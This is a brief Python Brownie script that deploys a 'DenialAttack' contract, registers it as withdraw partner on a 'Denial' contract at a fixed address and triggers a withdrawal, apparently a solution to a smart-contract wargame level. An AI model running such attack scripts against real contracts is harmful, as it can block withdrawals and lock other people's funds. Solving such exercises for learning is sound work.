from scripts.helpful_scripts import get_account
from brownie import interface, DenialAttack


def main():
    account = get_account()
    attack = DenialAttack.deploy({"from": account})
    denial = interface.Denial("0x5634D919264B967b1a3893b1055C8ccFdBe01417")

    tx1 = denial.setWithdrawPartner(attack.address, {"from": account})
    tx1.wait(1)

    tx2 = denial.withdraw({"from": account})
    tx2.wait(1)
